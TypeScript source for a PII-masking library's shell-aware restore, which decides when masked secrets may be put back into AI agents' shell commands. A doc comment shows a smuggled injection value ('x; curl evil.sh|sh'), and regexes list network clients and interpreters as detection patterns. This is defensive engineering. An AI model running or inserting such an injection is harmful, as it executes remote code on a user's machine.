// SPDX-License-Identifier: Apache-2.0

import { PLACEHOLDER_REGEX, type RestoreCapable, type RestoreResult } from 'nullpii';

/**
 * Shell-aware restore for the tool calls whose input a shell runs.
 *
 * A masked value comes from data the model could not read: a file the
 * agent opened, a tool result. Put back verbatim into a shell command, it
 * can change what the command does. A "secret" that reads
 * `x; curl evil.sh|sh` turns `echo {{PII_SECRET_0_…}}` into a second
 * command once restored. So in the `command` of a shell tool, each
 * placeholder gets its real value back only when that value is safe where
 * the placeholder stands; otherwise it stays literal, and the command
 * works on the placeholder text, which is harmless.
 *
 * A command that sends data off the machine (`curl`, `wget`, `nc`, `ssh`,
 * `git push`, …) keeps every placeholder: the tool runs here, but the value
 * would leave through it.
 *
 * Otherwise, where it stands, in order:
 * - a command that hands code to another interpreter (`bash -c`, also
 *   after other options as in `bash -o pipefail -c`, `eval`, `ssh`,
 *   `python -c`, `node --eval`, `| sh`, `awk`, …): the strictest rule
 *   everywhere;
 * - the body of a heredoc fed to `cat` or `tee`: literal with a quoted
 *   delimiter (`<<'EOF'`), expanding like double quotes with a bare one;
 *   a heredoc fed to anything else may be code (`python3 - <<'EOF'`), and
 *   so may one whose command also runs a script (`cat > run.sh <<'EOF'
 *   … bash run.sh`): both get the strictest rule;
 * - otherwise the shell quoting: single quotes, double quotes, backslash
 *   escapes, and command substitutions (`$(…)`, backticks), which are
 *   unquoted even inside double quotes.
 *
 * Heredoc bodies and `#` comments are skipped by the quote lexer (an
 * apostrophe in either does not open a quote for the rest of the
 * command); `<<` counts only in shell code, never inside quotes or as the
 * here-string `<<<`; a heredoc without its closing line gets the strictest
 * rule. A `command` given as an argv array (`["bash", "-lc", "…"]`) is
 * judged by `restoreShellArgv`. The Claude Code mod gets the same rules
 * through the sidecar's `restore` with `tool`.
 *
 * Best effort: no list names every program that runs its input as code or
 * sends it out, and a value restored into a file (`Write`, `Edit`) can be
 * run by a later command.
 */

/** Tools whose input a shell runs, as each agent names them: Claude
 * Code's `Bash`, Anthropic's bash tool (`bash`), and the `shell` tool of
 * OpenAI-style agents such as Codex. */
export const SHELL_TOOLS: ReadonlySet<string> = new Set(['Bash', 'bash', 'shell']);

/** The input field of a shell tool that the shell interprets. */
export const SHELL_COMMAND_FIELD = 'command';

export type QuoteContext = 'none' | 'single' | 'double' | 'heredoc';

/** What a value may contain to be put back where its placeholder stands:
 * it must not add commands, expand anything, or end its quotes. */
const SHELL_SAFE: Readonly<Record<QuoteContext, RegExp>> = {
  none: /^[A-Za-z0-9@%+=:,./_-]+$/,
  single: /^[^'\n]*$/,
  double: /^[^"$`\\!\n]*$/,
  // A quoted-delimiter heredoc body is literal; only a newline could end
  // it early, with the delimiter on a line of its own.
  heredoc: /^[^\n]*$/,
};

/** The rest of one simple command, up to a bound: from an interpreter's
 * name to its code flag, past other options and their arguments. */
const SAME_COMMAND = String.raw`[^;&|\n]{0,256}?`;

/** Programs that run part of their arguments, or what is piped to them,
 * as code: a value safe for the outer shell can still inject into them.
 * Each code flag may follow other options (`bash -o pipefail -c`,
 * `bash --norc -c`); a flag cluster counts when it holds the code letter
 * (`-lc`, `-ce`). */
const NESTED_INTERPRETER = new RegExp(
  [
    String.raw`\b(?:bash|sh|zsh|dash|ksh|fish)\b${SAME_COMMAND}\s(?:-[A-Za-z]*c[A-Za-z]*|--command)\b`,
    String.raw`\beval\b|\bssh\b|\bsu\b${SAME_COMMAND}\s(?:-c|--command)\b`,
    String.raw`\b(?:python[\d.]*|pypy[\d.]*)\b${SAME_COMMAND}\s-[A-Za-z]*c[A-Za-z]*\b`,
    String.raw`\b(?:node|nodejs|bun|deno)\b${SAME_COMMAND}\s(?:-[A-Za-z]*[ep][A-Za-z]*|--eval|--print|eval)\b`,
    String.raw`\b(?:perl|ruby|lua|Rscript|osascript)\b${SAME_COMMAND}\s-[A-Za-z]*[eE][A-Za-z]*\b`,
    String.raw`\bphp\b${SAME_COMMAND}\s-[A-Za-z]*r[A-Za-z]*\b`,
    /\|\s*(?:sudo\s+)?(?:bash|sh|zsh|dash|ksh|fish|python[\d.]*|node|perl|ruby|php|deno|bun)\b/
      .source,
    /\b(?:awk|gawk|mawk|nawk|sed)\b/.source,
  ].join('|'),
);

/** Where a command starts: the beginning, or after a separator, plus the
 * prefixes that run the next word as the program (`sudo curl`). */
const COMMAND_POSITION = String.raw`(?:^|[;&|(\n\x60]|\$\()\s*(?:(?:sudo|nohup|exec|time|env|command|xargs)\s+(?:-\S+\s+)*)*(?:\S*/)?`;

/** Commands that send data off the machine. Names that cannot be anything
 * else count anywhere in the command; short or common ones only where a
 * command starts; `git` and package managers only for the subcommands that
 * upload. Best effort: no list names every way out. */
const NETWORK_CLIENT = new RegExp(
  [
    /\b(?:curl|wget|ncat|netcat|socat|ssh|scp|sftp|rsync|telnet|aria2c)\b/.source,
    /\b(?:Invoke-WebRequest|Invoke-RestMethod)\b/.source,
    String.raw`${COMMAND_POSITION}(?:nc|ftp|https?|xh|iwr|irm)\b`,
    String.raw`\bgit\b${SAME_COMMAND}\s(?:push|send-email|remote\s+(?:add|set-url))\b`,
    /\b(?:npm|pnpm|yarn)\s+publish\b/.source,
    /\/dev\/(?:tcp|udp)\//.source,
  ].join('|'),
  'i',
);

/** In code handed to an interpreter: a URL or a networking library. */
const NETWORK_IN_CODE =
  /[a-z][a-z0-9+.-]*:\/\/|\b(?:requests|urllib|httpx|aiohttp|socket|fetch|axios|XMLHttpRequest|WebSocket|LWP|IO::Socket|Net::HTTP|http\.client|net\.connect)\b/;

/** In shell code outside heredoc bodies: something that runs a script,
 * such as one the same command just wrote from a heredoc. */
const RUNS_SCRIPT = new RegExp(
  [
    /(?:^|[\s;&|(\x60])(?:bash|sh|zsh|dash|ksh|fish|source|exec|python[\d.]*|node|nodejs|perl|ruby|php|deno|bun)\b/
      .source,
    String.raw`${COMMAND_POSITION}(?:\.\s+\S|\.{1,2}/)`,
    /\bchmod\b[^;&|\n]*\+x/.source,
  ].join('|'),
);

/** A heredoc operator, read at one position: `<<` or `<<-`, then a
 * delimiter that is quoted (`'EOF'`, `"EOF"`), backslash-escaped (`\EOF`)
 * or bare (`EOF`). Groups: 1 dash, 3 quoted word, 4 escaped word, 5 bare. */
const HEREDOC_OPERATOR = /<<(-?)[ \t]*(?:(['"])([A-Za-z_]\w*)\2|\\([A-Za-z_]\w*)|([A-Za-z_]\w*))/;

/** Commands whose heredoc body is data, not code. */
const HEREDOC_DATA_COMMANDS: ReadonlySet<string> = new Set(['cat', 'tee']);

/** Characters after which a new simple command starts. */
const COMMAND_SEPARATORS: ReadonlySet<string> = new Set([';', '&', '|', '\n', '(', '{']);

/** Characters after which `#` starts a comment: it must begin a word.
 * Not `$` (`$#`) or `{` (`${#x}`). A backtick counts, so a doubtful `#`
 * is read as a comment, which only makes the context after it stricter. */
const COMMENT_PRECEDERS: ReadonlySet<string> = new Set([
  ' ',
  '\t',
  '\n',
  ';',
  '&',
  '|',
  '(',
  ')',
  '<',
  '>',
  '`',
]);

const ENV_ASSIGNMENT = /^[A-Za-z_]\w*=/;
const LEADING_TABS = /^\t+/;

type FrameKind = 'code' | 'subst' | 'backtick' | 'single' | 'double' | 'body';

/** Shell code, where quotes, substitutions and operators mean something. */
const CODE_KINDS: ReadonlySet<FrameKind> = new Set(['code', 'subst', 'backtick']);

/** One level of shell nesting. `body` is an unquoted heredoc body: it
 * expands `$` and backticks like double quotes, but `"` is literal. In a
 * code frame, `cmdStart` is where the current simple command began, and
 * `depth` counts the `(` opened inside a `$(…)`. */
interface Frame {
  readonly kind: FrameKind;
  depth: number;
  cmdStart: number;
}

/** A heredoc whose body starts at the next newline of shell code. */
interface Heredoc {
  /** `undefined` when the delimiter could not be read. */
  readonly delimiter: string | undefined;
  /** Quoted or escaped delimiter: the body is literal. */
  readonly literal: boolean;
  /** `<<-`: leading tabs are stripped from the closing line. */
  readonly stripTabs: boolean;
  /** Fed to `cat` or `tee` and not piped on, so the body is data. */
  readonly data: boolean;
}

/** Where a newline with pending heredocs leads: into the body holding the
 * target index, or past every body to `next`. */
type BodyScan = { readonly context: QuoteContext } | { readonly next: number };

/** A heredoc body's extent: from its first character to its closing line. */
interface BodyRange {
  readonly start: number;
  readonly end: number;
}

/** True when `name` is one of the `SHELL_TOOLS`. */
export function isShellTool(name: unknown): boolean {
  return typeof name === 'string' && SHELL_TOOLS.has(name);
}

/** True when `command` sends data off the machine: a network client, an
 * upload, or interpreter code that opens a URL or a socket. */
export function sendsOffMachine(command: string): boolean {
  if (NETWORK_CLIENT.test(command)) return true;
  return NESTED_INTERPRETER.test(command) && NETWORK_IN_CODE.test(command);
}

/** True when `value` can be put back as written in `context`. Outside a
 * heredoc body, a value starting with `-` is never safe: quoted or not,
 * the command it lands in would read it as an option (`rm '-rf'`). */
export function shellSafe(value: string, context: QuoteContext): boolean {
  if (context !== 'heredoc' && value.startsWith('-')) return false;
  return SHELL_SAFE[context].test(value);
}

/**
 * The context that decides what a restored value may contain at `index`
 * of a shell command: the strictest rule when the command hands code to
 * another interpreter, else the heredoc body or the shell quoting there.
 */
export function shellContextAt(command: string, index: number): QuoteContext {
  if (NESTED_INTERPRETER.test(command)) return 'none';
  if (inBodyOfRunScript(command, index)) return 'none';
  return lex(command, 0, index, codeFrame());
}

function codeFrame(): Frame {
  return { kind: 'code', depth: 0, cmdStart: 0 };
}

/** True when `index` is in a heredoc body and the command, outside its
 * bodies, also runs a script: the body may be that script. */
function inBodyOfRunScript(command: string, index: number): boolean {
  const bodies: BodyRange[] = [];
  lex(command, 0, command.length, codeFrame(), bodies);
  if (!bodies.some((b) => index >= b.start && index < b.end)) return false;
  let outside = '';
  let last = 0;
  for (const b of bodies) {
    outside += `${command.slice(last, b.start)}\n`;
    last = b.end;
  }
  return RUNS_SCRIPT.test(outside + command.slice(last));
}

/** Lex `command` from `start` to `index`, with `base` as the nesting in
 * force at `start`, and return the context at `index`. The extent of each
 * heredoc body passed whole is added to `bodies` when given. */
function lex(
  command: string,
  start: number,
  index: number,
  base: Frame,
  bodies?: BodyRange[],
): QuoteContext {
  const stack: Frame[] = [base];
  const pending: Heredoc[] = [];
  let i = start;
  while (i < index) {
    const frame = stack.at(-1) ?? base;
    if (command[i] === '\n' && pending.length > 0 && CODE_KINDS.has(frame.kind)) {
      const scan = readHeredocBodies(command, i + 1, index, pending, bodies);
      if ('context' in scan) return scan.context;
      pending.length = 0;
      frame.cmdStart = scan.next;
      i = scan.next;
      continue;
    }
    i += advance(stack, frame, pending, command, i);
  }
  const kind = stack.at(-1)?.kind;
  if (kind === 'single') return 'single';
  if (kind === 'double' || kind === 'body') return 'double';
  return 'none';
}

/** Read the token at `i`, update the nesting, return its length. */
function advance(
  stack: Frame[],
  frame: Frame,
  pending: Heredoc[],
  command: string,
  i: number,
): number {
  const ch = command[i];
  if (frame.kind === 'single') {
    if (ch === "'") stack.pop();
    return 1;
  }
  if (ch === '\\') return 2;
  if (ch === '$' && command[i + 1] === '(') {
    stack.push({ kind: 'subst', depth: 0, cmdStart: i + 2 });
    return 2;
  }
  if (ch === '`') {
    if (frame.kind === 'backtick') stack.pop();
    else stack.push({ kind: 'backtick', depth: 0, cmdStart: i + 1 });
    return 1;
  }
  if (frame.kind === 'double') {
    if (ch === '"') stack.pop();
    return 1;
  }
  if (frame.kind === 'body') return 1;
  return advanceCode(stack, frame, pending, command, i);
}

/** One token of shell code: the top level, or inside a substitution. */
function advanceCode(
  stack: Frame[],
  frame: Frame,
  pending: Heredoc[],
  command: string,
  i: number,
): number {
  const ch = command[i];
  if (ch === '#' && startsWord(command, i)) return commentLength(command, i);
  if (ch === '<' && command[i + 1] === '<') return readHeredocOperator(command, i, frame, pending);
  if (ch === "'") stack.push({ kind: 'single', depth: 0, cmdStart: 0 });
  else if (ch === '"') stack.push({ kind: 'double', depth: 0, cmdStart: 0 });
  else if (frame.kind === 'subst') trackParens(stack, frame, ch);
  if (ch !== undefined && COMMAND_SEPARATORS.has(ch)) frame.cmdStart = i + 1;
  return 1;
}

/** True when the character at `i` begins a word of shell code. */
function startsWord(command: string, i: number): boolean {
  const before = command[i - 1];
  return before === undefined || COMMENT_PRECEDERS.has(before);
}

/** A comment runs to the end of its line; the newline is left to the
 * caller, since heredoc bodies may start after it. */
function commentLength(command: string, i: number): number {
  const newline = command.indexOf('\n', i);
  return (newline === -1 ? command.length : newline) - i;
}

function trackParens(stack: Frame[], frame: Frame, ch: string | undefined): void {
  if (ch === '(') frame.depth += 1;
  if (ch !== ')') return;
  if (frame.depth === 0) stack.pop();
  else frame.depth -= 1;
}

/** Record the heredoc whose operator starts at `i`; return its length.
 * `<<<` is a here-string: the word after it is an ordinary argument. */
function readHeredocOperator(command: string, i: number, frame: Frame, pending: Heredoc[]): number {
  if (command[i + 2] === '<') return 3;
  const operator = new RegExp(HEREDOC_OPERATOR.source, 'y');
  operator.lastIndex = i;
  const m = operator.exec(command);
  if (m === null) {
    pending.push({ delimiter: undefined, literal: false, stripTabs: false, data: false });
    return 2;
  }
  const newline = command.indexOf('\n', i);
  const restOfLine = command.slice(i, newline === -1 ? command.length : newline);
  const word = commandWord(command.slice(frame.cmdStart, i));
  const quoted = m[3] ?? m[4];
  pending.push({
    delimiter: quoted ?? m[5],
    literal: quoted !== undefined,
    stripTabs: m[1] === '-',
    data: HEREDOC_DATA_COMMANDS.has(word) && !restOfLine.includes('|'),
  });
  return m[0].length;
}

/** The program a simple command runs: its first word that is not an
 * environment assignment, without a directory (`/bin/cat` → `cat`). */
function commandWord(text: string): string {
  const word = text
    .trim()
    .split(/\s+/)
    .find((w) => !ENV_ASSIGNMENT.test(w));
  return word?.split('/').at(-1) ?? '';
}

/** Walk the bodies of the heredocs that start at `start`, in order. */
function readHeredocBodies(
  command: string,
  start: number,
  index: number,
  pending: readonly Heredoc[],
  bodies?: BodyRange[],
): BodyScan {
  let bodyStart = start;
  for (const heredoc of pending) {
    const end = findClosingLine(command, bodyStart, heredoc);
    // An unreadable delimiter or no closing line: the body's extent, and
    // so what follows it, is unknown.
    if (end === undefined) return { context: 'none' };
    if (index < end.bodyEnd) return { context: bodyContext(command, bodyStart, index, heredoc) };
    bodies?.push({ start: bodyStart, end: end.bodyEnd });
    bodyStart = end.next;
  }
  return { next: bodyStart };
}

function bodyContext(
  command: string,
  start: number,
  index: number,
  heredoc: Heredoc,
): QuoteContext {
  if (!heredoc.data) return 'none';
  if (heredoc.literal) return 'heredoc';
  return lex(command, start, index, { kind: 'body', depth: 0, cmdStart: 0 });
}

/** The body's end (start of the closing line) and where shell code
 * resumes (the newline after it), or `undefined` when there is none. */
function findClosingLine(
  command: string,
  start: number,
  heredoc: Heredoc,
): { bodyEnd: number; next: number } | undefined {
  if (heredoc.delimiter === undefined) return undefined;
  let lineStart = start;
  while (lineStart <= command.length) {
    const newline = command.indexOf('\n', lineStart);
    const lineEnd = newline === -1 ? command.length : newline;
    const line = command.slice(lineStart, lineEnd);
    const candidate = heredoc.stripTabs ? line.replace(LEADING_TABS, '') : line;
    if (candidate === heredoc.delimiter) return { bodyEnd: lineStart, next: lineEnd };
    if (newline === -1) return undefined;
    lineStart = newline + 1;
  }
  return undefined;
}

/** A shell command with its safe placeholders restored. */
export interface ShellRestore {
  readonly command: string;
  /** One result per placeholder restored, or found unknown or foreign
   * (left literal, and counted as such by the caller). */
  readonly results: readonly RestoreResult[];
  /** The placeholders left literal because their value was not safe
   * where they stand, once per occurrence. Placeholders, never values. */
  readonly keptMasked: readonly string[];
}

/**
 * Restore the placeholders in a shell `command`, each only when its real
 * value is safe in the context at its position (`shellContextAt`), and
 * none in a command that sends data off the machine (`sendsOffMachine`).
 * Contexts are read on the command as received: a value restored there
 * never ends its quoting or its heredoc, so it cannot change the context
 * of a later placeholder.
 *
 * @param np - the engine whose vault holds `sessionId`.
 */
export function restoreShellCommand(
  np: RestoreCapable,
  command: string,
  sessionId: string,
): ShellRestore {
  const offline = !sendsOffMachine(command);
  return restoreEach(np, command, sessionId, (value, at) =>
    offline ? shellSafe(value, shellContextAt(command, at)) : false,
  );
}

/** A shell `command` given as an argv array, with its safe placeholders
 * restored. */
export interface ShellArgvRestore {
  readonly argv: readonly string[];
  readonly results: readonly RestoreResult[];
  readonly keptMasked: readonly string[];
}

/**
 * Restore the placeholders of a `command` given as an argv array, as
 * Codex's `shell` tool sends it (`["bash", "-lc", "…"]`). The program
 * runs without a shell, so each argument is taken literally, unless:
 * - the program sends data off the machine: nothing is restored;
 * - it hands code to an interpreter (`bash -lc`, `python3 -c`, …): every
 *   argument gets the strictest rule, as in a string command;
 * - the value would be the program itself, or start an argument with `-`,
 *   where it would be read as an option: the strictest rule.
 *
 * @param np - the engine whose vault holds `sessionId`.
 */
export function restoreShellArgv(
  np: RestoreCapable,
  argv: readonly string[],
  sessionId: string,
): ShellArgvRestore {
  const joined = argv.join(' ');
  const offline = !sendsOffMachine(joined);
  const code = NESTED_INTERPRETER.test(joined);
  const results: RestoreResult[] = [];
  const keptMasked: string[] = [];
  const restored = argv.map((word, position) => {
    const r = restoreEach(np, word, sessionId, (value, at) => {
      if (!offline) return false;
      if (code || position === 0) return shellSafe(value, 'none');
      return at > 0 || !value.startsWith('-');
    });
    results.push(...r.results);
    keptMasked.push(...r.keptMasked);
    return r.command;
  });
  return { argv: restored, results, keptMasked };
}

/** Restore each placeholder of `text` whose real value `safe` accepts at
 * the placeholder's index; leave the others literal. */
function restoreEach(
  np: RestoreCapable,
  text: string,
  sessionId: string,
  safe: (value: string, at: number) => boolean,
): ShellRestore {
  const results: RestoreResult[] = [];
  const keptMasked: string[] = [];
  let out = '';
  let last = 0;
  for (const match of text.matchAll(placeholderPattern())) {
    const start = match.index;
    const placeholder = match[0];
    const r = np.restore(placeholder, sessionId);
    const ok = r.replacements === 0 || safe(r.restored, start);
    if (ok) results.push(r);
    else keptMasked.push(placeholder);
    out += text.slice(last, start) + (ok ? r.restored : placeholder);
    last = start + placeholder.length;
  }
  return { command: out + text.slice(last), results, keptMasked };
}

/** How many placeholders `text` holds. */
export function countPlaceholders(text: string): number {
  return placeholdersIn(text).length;
}

/** The placeholders `text` holds, in order, once per occurrence. */
export function placeholdersIn(text: string): string[] {
  return [...text.matchAll(placeholderPattern())].map((m) => m[0]);
}

/** A fresh global copy: `matchAll` needs the `g` flag, and a shared
 * global regex would carry `lastIndex` between callers. */
function placeholderPattern(): RegExp {
  return new RegExp(PLACEHOLDER_REGEX.source, 'g');
}
